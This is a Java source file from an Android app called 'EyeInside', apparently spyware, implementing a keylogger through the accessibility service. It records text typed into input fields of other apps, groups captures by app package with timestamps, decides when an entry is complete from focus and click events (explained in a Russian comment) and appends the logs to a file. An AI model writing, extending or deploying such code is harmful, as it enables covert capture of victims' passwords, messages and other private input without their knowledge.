package com.code4bones.EyeInside;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

import com.code4bones.utils.NetLog;

import android.view.accessibility.AccessibilityEvent;

/*
 * 1. фокус - мы попали на поле ввода (GOT_FOCUS)
 * т.е готовы записывать клавиши, запись закроется, как только придет другое
 * событие, например клил по другому полю,по сути это значит, что например была
 * нажата кропа "отправить", или изменилось поле ( еще одно событие на фокус )
 * 
 */

public class KeyLogManager {

	
	public Map<String,ArrayList<KeyLogObj>> mLog = new HashMap<String,ArrayList<KeyLogObj>>();
	public KeyLogObj mCurrent = null;
	public String mFilePath;
	
	private static class HOLDER {
		private static final KeyLogManager INSTANCE = new KeyLogManager();
	}
	
	public static KeyLogManager getInstance() {
		return HOLDER.INSTANCE;
	}
	
	public KeyLogManager() {
		NetLog.v("KeyLogManager created");
	}

	
	public void handleEvent(AccessibilityEvent event) {
		String packageName = event.getPackageName().toString();
		String className = event.getClassName().toString();
		String text = event.getText().toString();
		switch ( event.getEventType() ) {
		case AccessibilityEvent.TYPE_VIEW_FOCUSED:
			handleFocused(packageName,className,text);
			break;
		case AccessibilityEvent.TYPE_VIEW_CLICKED:
			handleClicked(packageName,className,text);
			break;
		case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
			handleChanged(packageName,className,text);
			break;
		} 
	}
	
	public void closeIfNeeded(String packageName,String clazz,String text,boolean click) {
		if ( mCurrent != null ) {
			if ( mCurrent.compareAvg(text) > 25 ) {
				NetLog.v("Close: %s->%s",mCurrent.mText,text);
				mCurrent.mComplete = true;
				mCurrent = null;
				try {
					dump();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				if ( click && text.length() > 0 ) {
					ArrayList<KeyLogObj> list = mLog.get(packageName);
					if ( list == null ) {
						list = new ArrayList<KeyLogObj>();
						mLog.put(packageName, list);
					}
					KeyLogObj log = new KeyLogObj(clazz,text);
					log.mComplete = true;
					list.add(log);
				}
			} else {
				NetLog.v("DONT CLOSE: %s->%s",mCurrent.mText,text);
			}
		}
	}
	
	public void handleFocused(String packageName,String clazz,String text) {
		closeIfNeeded(packageName,clazz,text,false);
	}
	
	public void handleClicked(String packageName,String clazz,String text) {
		closeIfNeeded(packageName,clazz,text,true);
	}
	
	public void handleChanged(String packageName,String clazz,String text) {
		//NetLog.v("Changed: %s(%s):%s",packageName,clazz,text);
		ArrayList<KeyLogObj> list = null;
		if ( mCurrent != null ) {
			NetLog.v("Change Current");
			mCurrent.replaceText(text);
			return;
		} else {
			NetLog.v("Set Current");
		}
		if ( !mLog.containsKey(packageName)) {
			list = new ArrayList<KeyLogObj>();
			mLog.put(packageName, list);
		} else {
			list = mLog.get(packageName);
		}
		
		mCurrent = findActiveLog(packageName,clazz,text);
		if ( mCurrent == null ) {
			mCurrent = new KeyLogObj(clazz,text);
			list.add(mCurrent);
			NetLog.v("Create new LIST");
		} else {
			mCurrent.replaceText(text);
		}
	}
	public KeyLogObj findActiveLog(String packageName,String clazz,String text) {
		ArrayList<KeyLogObj> list = mLog.get(packageName);
		for ( KeyLogObj log : list ) {
			if ( !log.mComplete && log.isEqual(clazz,text) ) {
				return log;
			}
		}
		return null;
	}
	public ArrayList<KeyLogObj> createList(KeyLogObj log) {
		ArrayList<KeyLogObj> list = new ArrayList<KeyLogObj>();
		list.add(log);
		return list;
	}
	
	
	public void dump() throws IOException {
		File file = new File(mFilePath);
		FileOutputStream fos = new FileOutputStream(file,true);
		PrintStream ps = new PrintStream(fos);
		Set<String> keys = mLog.keySet();
		for ( String key : keys.toArray(new String[]{})) {
			ArrayList<KeyLogObj> list = mLog.get(key);
			if ( list.isEmpty() )
				continue;
			ArrayList<KeyLogObj> remove = new ArrayList<KeyLogObj>();
			ps.printf("PACKAGE: %s\r\n", key);
			for ( KeyLogObj log : list ) {
				if ( log.mComplete ) {
					ps.printf("[%s] %s\r\n",log.mDate.toLocaleString(),log.mText);
					remove.add(log);
				}
			}
			NetLog.v("Flush %d objects",remove.size());
			list.removeAll(remove);
		}
		ps.close();
		fos.close();
	}
}
